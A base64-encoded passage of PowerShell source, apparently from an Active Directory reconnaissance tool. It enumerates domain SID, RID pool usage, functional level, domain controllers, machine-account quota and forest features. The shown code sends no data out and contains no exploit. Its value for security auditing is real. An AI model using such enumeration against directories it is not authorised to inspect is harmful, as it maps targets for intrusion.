ICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgICAgICB9CiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBEb21haW5Db250ZXh0CiAgICAgICAgICAgICMgR2V0IFJJREF2YWlsYWJsZVBvb2wKICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTZWFyY2hQYXRoID0gIkNOPVJJRCBNYW5hZ2VyJCxDTj1TeXN0ZW0iCiAgICAgICAgICAgICAgICAkb2JqU2VhcmNoUGF0aCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5ICJMREFQOi8vJCgkRG9tYWluQ29udHJvbGxlcikvJFNlYXJjaFBhdGgsJCgkb2JqRG9tYWluLmRpc3Rpbmd1aXNoZWROYW1lKSIsICRDcmVkZW50aWFsLlVzZXJOYW1lLCRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQKICAgICAgICAgICAgICAgICRvYmpTZWFyY2hlclBhdGggPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqU2VhcmNoUGF0aAogICAgICAgICAgICAgICAgJG9ialNlYXJjaGVyUGF0aC5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZFJhbmdlKCgicmlkYXZhaWxhYmxlcG9vbCIpKQogICAgICAgICAgICAgICAgJG9ialNlYXJjaGVyUmVzdWx0ID0gJG9ialNlYXJjaGVyUGF0aC5GaW5kQWxsKCkKICAgICAgICAgICAgICAgICRSSURwcm9wZXJ0eSA9ICRvYmpTZWFyY2hlclJlc3VsdC5Qcm9wZXJ0aWVzLnJpZGF2YWlsYWJsZXBvb2wKICAgICAgICAgICAgICAgIFtpbnQzMl0gJHRvdGFsU0lEUyA9ICQoJFJJRHByb3BlcnR5KSAvIChbbWF0aF06OlBvdygyLDMyKSkKICAgICAgICAgICAgICAgIFtpbnQ2NF0gJHRlbXA2NHZhbCA9ICR0b3RhbFNJRFMgKiAoW21hdGhdOjpQb3coMiwzMikpCiAgICAgICAgICAgICAgICAkUklEc0lzc3VlZCA9IFtpbnQzMl0oJCgkUklEcHJvcGVydHkpIC0gJHRlbXA2NHZhbCkKICAgICAgICAgICAgICAgICRSSURzUmVtYWluaW5nID0gJHRvdGFsU0lEUyAtICRSSURzSXNzdWVkCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgU2VhcmNoUGF0aAogICAgICAgICAgICAgICAgJG9ialNlYXJjaFBhdGguRGlzcG9zZSgpCiAgICAgICAgICAgICAgICAkb2JqU2VhcmNoZXJQYXRoLkRpc3Bvc2UoKQogICAgICAgICAgICAgICAgJG9ialNlYXJjaGVyUmVzdWx0LkRpc3Bvc2UoKQogICAgICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIFJJRHByb3BlcnR5CiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgdG90YWxTSURTCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgdGVtcDY0dmFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJEb21haW5dIEVycm9yIGFjY2Vzc2luZyBDTj1SSUQgTWFuYWdlciQsQ049U3lzdGVtLCQoJFNlYXJjaFBhdGgpLCQoJG9iakRvbWFpbi5kaXN0aW5ndWlzaGVkTmFtZSkiCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBUcnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEZvcmVzdENvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCgiRm9yZXN0IiwkKCRBRERvbWFpbi5Gb3Jlc3QpLCQoJENyZWRlbnRpYWwuVXNlck5hbWUpLCQoJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5wYXNzd29yZCkpCiAgICAgICAgICAgICAgICAkQURGb3Jlc3QgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Gb3Jlc3RdOjpHZXRGb3Jlc3QoJEZvcmVzdENvbnRleHQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJEb21haW5dIEVycm9yIGdldHRpbmcgRm9yZXN0IENvbnRleHQiCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBJZiAoJEZvcmVzdENvbnRleHQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBGb3Jlc3RDb250ZXh0CiAgICAgICAgICAgIH0KICAgICAgICAgICAgSWYgKCRBREZvcmVzdCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEdsb2JhbENhdGFsb2cgPSAkQURGb3Jlc3QuRmluZEdsb2JhbENhdGFsb2coKQogICAgICAgICAgICB9CiAgICAgICAgICAgIElmICgkR2xvYmFsQ2F0YWxvZykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEROID0gIkdDOi8vJCgkR2xvYmFsQ2F0YWxvZy5JUEFkZHJlc3MpLyQoJG9iakRvbWFpbi5kaXN0aW5ndWlzaGVkbmFtZSkiCiAgICAgICAgICAgICAgICBUcnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkQURPYmplY3QgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkgLUFyZ3VtZW50TGlzdCAoJCgkRE4pLCQoJENyZWRlbnRpYWwuVXNlck5hbWUpLCQoJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5wYXNzd29yZCkpCiAgICAgICAgICAgICAgICAgICAgJEFERG9tYWluU0lEID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkQURPYmplY3Qub2JqZWN0U2lkWzBdLCAwKQogICAgICAgICAgICAgICAgICAgICRBRE9iamVjdC5EaXNwb3NlKCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJEb21haW5dIEVycm9yIHJldHJpZXZpbmcgRG9tYWluIFNJRCB1c2luZyB0aGUgR2xvYmFsQ2F0YWxvZyAkKCRHbG9iYWxDYXRhbG9nLklQQWRkcmVzcykuIFVzaW5nIFNJRCBmcm9tIHRoZSBPYmpEb21haW4uIgogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgICAgICRBRERvbWFpblNJRCA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXIoJG9iakRvbWFpbi5vYmplY3RTaWRbMF0sIDApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgRWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQUREb21haW5TSUQgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRvYmpEb21haW4ub2JqZWN0U2lkWzBdLCAwKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIEVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRBRERvbWFpbiA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldEN1cnJlbnREb21haW4oKQogICAgICAgICAgICAkQURGb3Jlc3QgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Gb3Jlc3RdOjpHZXRDdXJyZW50Rm9yZXN0KCkKICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRHbG9iYWxDYXRhbG9nID0gJEFERm9yZXN0LkZpbmRHbG9iYWxDYXRhbG9nKCkKICAgICAgICAgICAgICAgICRETiA9ICJHQzovLyQoJEdsb2JhbENhdGFsb2cpLyQoJG9iakRvbWFpbi5kaXN0aW5ndWlzaGVkbmFtZSkiCiAgICAgICAgICAgICAgICAkQURPYmplY3QgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkgLUFyZ3VtZW50TGlzdCAoJEROKQogICAgICAgICAgICAgICAgJEFERG9tYWluU0lEID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkQURPYmplY3Qub2JqZWN0U2lkWzBdLCAwKQogICAgICAgICAgICAgICAgJEFET2JqZWN0LmRpc3Bvc2UoKQogICAgICAgICAgICB9CiAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSRG9tYWluXSBFcnJvciByZXRyaWV2aW5nIERvbWFpbiBTSUQgdXNpbmcgdGhlIEdsb2JhbENhdGFsb2cgJCgkR2xvYmFsQ2F0YWxvZy5JUEFkZHJlc3MpLiBVc2luZyBTSUQgZnJvbSB0aGUgT2JqRG9tYWluLiIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgJEFERG9tYWluU0lEID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkb2JqRG9tYWluLm9iamVjdFNpZFswXSwgMCkKICAgICAgICAgICAgfQogICAgICAgICAgICAjIEdldCBSSURBdmFpbGFibGVQb29sCiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUklETWFuYWdlciA9IChbQURTSV0iTERBUDovL0NOPVJJRCBNYW5hZ2VyJCxDTj1TeXN0ZW0sJCgkb2JqRG9tYWluLmRpc3Rpbmd1aXNoZWROYW1lKSIpCiAgICAgICAgICAgICAgICAkUklEcHJvcGVydHkgPSAkT2JqRG9tYWluLkNvbnZlcnRMYXJnZUludGVnZXJUb0ludDY0KCRSSURNYW5hZ2VyLlByb3BlcnRpZXMucklEQXZhaWxhYmxlUG9vbC52YWx1ZSkKICAgICAgICAgICAgICAgIFtpbnQzMl0gJHRvdGFsU0lEUyA9ICQoJFJJRHByb3BlcnR5KSAvIChbbWF0aF06OlBvdygyLDMyKSkKICAgICAgICAgICAgICAgIFtpbnQ2NF0gJHRlbXA2NHZhbCA9ICR0b3RhbFNJRFMgKiAoW21hdGhdOjpQb3coMiwzMikpCiAgICAgICAgICAgICAgICAkUklEc0lzc3VlZCA9IFtpbnQzMl0oJCgkUklEcHJvcGVydHkpIC0gJHRlbXA2NHZhbCkKICAgICAgICAgICAgICAgICRSSURzUmVtYWluaW5nID0gJHRvdGFsU0lEUyAtICRSSURzSXNzdWVkCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgUklETWFuYWdlcgogICAgICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIFJJRHByb3BlcnR5CiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgdG90YWxTSURTCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgdGVtcDY0dmFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJEb21haW5dIEVycm9yIGFjY2Vzc2luZyBDTj1SSUQgTWFuYWdlciQsQ049U3lzdGVtLCQoJFNlYXJjaFBhdGgpLCQoJG9iakRvbWFpbi5kaXN0aW5ndWlzaGVkTmFtZSkiCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgSWYgKCRBRERvbWFpbikKICAgICAgICB7CiAgICAgICAgICAgICREb21haW5PYmogPSBAKCkKCiAgICAgICAgICAgICMgVmFsdWVzIHRha2VuIGZyb20gaHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9oaDg1MjI4MSh2PXdwcy42MzApLmFzcHgKICAgICAgICAgICAgJEZMQUQgPSBAewoJICAgICAgICAgICAgMCA9ICJXaW5kb3dzMjAwMCI7CgkgICAgICAgICAgICAxID0gIldpbmRvd3MyMDAzL0ludGVyaW0iOwoJICAgICAgICAgICAgMiA9ICJXaW5kb3dzMjAwMyI7CgkgICAgICAgICAgICAzID0gIldpbmRvd3MyMDA4IjsKCSAgICAgICAgICAgIDQgPSAiV2luZG93czIwMDhSMiI7CgkgICAgICAgICAgICA1ID0gIldpbmRvd3MyMDEyIjsKCSAgICAgICAgICAgIDYgPSAiV2luZG93czIwMTJSMiI7CgkgICAgICAgICAgICA3ID0gIldpbmRvd3MyMDE2IgogICAgICAgICAgICB9CiAgICAgICAgICAgICREb21haW5Nb2RlID0gJEZMQURbW2NvbnZlcnRdOjpUb0ludDMyKCRvYmpEb21haW5Sb290RFNFLmRvbWFpbkZ1bmN0aW9uYWxpdHksMTApXSArICJEb21haW4iCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBGTEFECgogICAgICAgICAgICAkT2JqVmFsdWVzID0gQCgiTmFtZSIsICRBRERvbWFpbi5OYW1lLCAiTmV0QklPUyIsICRvYmpEb21haW4uZGMudmFsdWUsICJGdW5jdGlvbmFsIExldmVsIiwgJERvbWFpbk1vZGUsICJEb21haW5TSUQiLCAkQUREb21haW5TSUQuVmFsdWUpCgogICAgICAgICAgICBGb3IgKCRpID0gMDsgJGkgLWx0ICQoJE9ialZhbHVlcy5Db3VudCk7ICRpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRPYmogPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgJE9ialZhbHVlc1skaV0KICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkT2JqVmFsdWVzWyRpKzFdCiAgICAgICAgICAgICAgICAkaSsrCiAgICAgICAgICAgICAgICAkRG9tYWluT2JqICs9ICRPYmoKICAgICAgICAgICAgfQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgRG9tYWluTW9kZQoKICAgICAgICAgICAgRm9yKCRpPTA7ICRpIC1sdCAkQUREb21haW4uRG9tYWluQ29udHJvbGxlcnMuQ291bnQ7ICRpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRPYmogPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgIkRvbWFpbiBDb250cm9sbGVyIgogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICRBRERvbWFpbi5Eb21haW5Db250cm9sbGVyc1skaV0KICAgICAgICAgICAgICAgICREb21haW5PYmogKz0gJE9iagogICAgICAgICAgICB9CgogICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgIkNyZWF0aW9uIERhdGUiCiAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkb2JqRG9tYWluLndoZW5jcmVhdGVkLnZhbHVlCiAgICAgICAgICAgICREb21haW5PYmogKz0gJE9iagoKICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJtcy1EUy1NYWNoaW5lQWNjb3VudFF1b3RhIgogICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlZhbHVlIiAtVmFsdWUgJG9iakRvbWFpbi4nbXMtRFMtTWFjaGluZUFjY291bnRRdW90YScudmFsdWUKICAgICAgICAgICAgJERvbWFpbk9iaiArPSAkT2JqCgogICAgICAgICAgICBJZiAoJFJJRHNJc3N1ZWQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRPYmogPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgIlJJRHMgSXNzdWVkIgogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICRSSURzSXNzdWVkCiAgICAgICAgICAgICAgICAkRG9tYWluT2JqICs9ICRPYmoKICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBSSURzSXNzdWVkCiAgICAgICAgICAgIH0KICAgICAgICAgICAgSWYgKCRSSURzUmVtYWluaW5nKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJSSURzIFJlbWFpbmluZyIKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkUklEc1JlbWFpbmluZwogICAgICAgICAgICAgICAgJERvbWFpbk9iaiArPSAkT2JqCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgUklEc1JlbWFpbmluZwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIElmICgkRG9tYWluT2JqKQogICAgewogICAgICAgIFJldHVybiAkRG9tYWluT2JqCiAgICB9CiAgICBFbHNlCiAgICB7CiAgICAgICAgUmV0dXJuICRudWxsCiAgICB9Cn0KCkZ1bmN0aW9uIEdldC1BRFJGb3Jlc3QKewo8IwouU1lOT1BTSVMKICAgIFJldHVybnMgaW5mb3JtYXRpb24gb2YgdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZm9yZXN0LgoKLkRFU0NSSVBUSU9OCiAgICBSZXR1cm5zIGluZm9ybWF0aW9uIG9mIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGZvcmVzdC4KCi5QQVJBTUVURVIgUHJvdG9jb2wKICAgIFtzdHJpbmddCiAgICBXaGljaCBwcm90b2NvbCB0byB1c2U7IEFEV1MgKGRlZmF1bHQpIG9yIExEQVAuCgouUEFSQU1FVEVSIG9iakRvbWFpbgogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgRG9tYWluIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouUEFSQU1FVEVSIG9iakRvbWFpblJvb3REU0UKICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0KICAgIFJvb3REU0UgRGlyZWN0b3J5IEVudHJ5IG9iamVjdC4KCi5QQVJBTUVURVIgRG9tYWluQ29udHJvbGxlcgogICAgW3N0cmluZ10KICAgIElQIEFkZHJlc3Mgb2YgdGhlIERvbWFpbiBDb250cm9sbGVyLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCiAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgIENyZWRlbnRpYWxzLgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFByb3RvY29sLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluUm9vdERTRSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtzdHJpbmddICREb21haW5Db250cm9sbGVyLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdBRFdTJykKICAgIHsKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRERvbWFpbiA9IEdldC1BRERvbWFpbgogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJGb3Jlc3RdIEVycm9yIGdldHRpbmcgRG9tYWluIENvbnRleHQiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CgogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFERm9yZXN0ID0gR2V0LUFERm9yZXN0ICRBRERvbWFpbi5Gb3Jlc3QKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtQURSRm9yZXN0XSBFcnJvciBnZXR0aW5nIEZvcmVzdCBDb250ZXh0IgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERG9tYWluCgogICAgICAgIElmICgtTm90ICRBREZvcmVzdCkKICAgICAgICB7CiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQURGb3Jlc3QgPSBHZXQtQURGb3Jlc3QgLVNlcnZlciAkRG9tYWluQ29udHJvbGxlcgogICAgICAgICAgICB9CiAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSRm9yZXN0XSBFcnJvciBnZXR0aW5nIEZvcmVzdCBDb250ZXh0IgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgSWYgKCRBREZvcmVzdCkKICAgICAgICB7CiAgICAgICAgICAgICMgR2V0IFRvbWJzdG9uZSBMaWZldGltZQogICAgICAgICAgICBUcnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEFERm9yZXN0Q05DID0gKEdldC1BRFJvb3REU0UpLmNvbmZpZ3VyYXRpb25OYW1pbmdDb250ZXh0CiAgICAgICAgICAgICAgICAkQURGb3Jlc3REU0NQID0gR2V0LUFET2JqZWN0IC1JZGVudGl0eSAiQ049RGlyZWN0b3J5IFNlcnZpY2UsQ049V2luZG93cyBOVCxDTj1TZXJ2aWNlcywkKCRBREZvcmVzdENOQykiIC1QYXJ0aXRpb24gJEFERm9yZXN0Q05DIC1Qcm9wZXJ0aWVzICoKICAgICAgICAgICAgICAgICRBREZvcmVzdFRvbWJzdG9uZUxpZmV0aW1lID0gJEFERm9yZXN0RFNDUC50b21ic3RvbmVMaWZldGltZQogICAgICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERm9yZXN0Q05DCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGb3Jlc3REU0NQCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJGb3Jlc3RdIEVycm9yIHJldHJpZXZpbmcgVG9tYnN0b25lIExpZmV0aW1lIgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgQ2hlY2sgUmVjeWNsZSBCaW4gRmVhdHVyZSBTdGF0dXMKICAgICAgICAgICAgSWYgKFtjb252ZXJ0XTo6VG9JbnQzMigkQURGb3Jlc3QuRm9yZXN0TW9kZSkgLWdlIDYpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRBRFJlY3ljbGVCaW4gPSBHZXQtQURPcHRpb25hbEZlYXR1cmUgLUlkZW50aXR5ICJSZWN5Y2xlIEJpbiBGZWF0dXJlIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkZvcmVzdF0gRXJyb3IgcmV0cmlldmluZyBSZWN5Y2xlIEJpbiBGZWF0dXJlIgogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIENoZWNrIFByaXZpbGVnZWQgQWNjZXNzIE1hbmFnZW1lbnQgRmVhdHVyZSBzdGF0dXMKICAgICAgICAgICAgSWYgKFtjb252ZXJ0XTo6VG9JbnQzMigkQURGb3Jlc3QuRm9yZXN0TW9kZSkgLWdlIDcpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRQcml2aWxlZ2VkQWNjZXNzTWFuYWdlbWVudCA9IEdldC1BRE9wdGlvbmFsRmVhdHVyZSAtSWRlbnRpdHkgIlByaXZpbGVnZWQgQWNjZXNzIE1hbmFnZW1lbnQgRmVhdHVyZSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJGb3Jlc3RdIEVycm9yIHJldHJpZXZpbmcgUHJpdmlsZWdlZCBBY2NlZXNzIE1hbmFnZW1lbnQgRmVhdHVyZSIKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAg